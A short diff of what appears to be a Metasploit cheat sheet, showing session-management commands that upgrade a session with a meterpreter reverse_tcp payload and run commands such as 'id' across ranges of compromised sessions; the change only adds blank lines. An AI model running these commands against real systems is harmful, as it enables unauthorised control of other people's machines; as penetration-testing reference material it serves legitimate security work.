@@ -21,3 +21,5 @@ sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp H
 sessions -c cmd           -> Execute a command on multiple sessions
 sessions -i 10-20 -c "id" -> Execute a command on a range of sessions
 ```
+
+
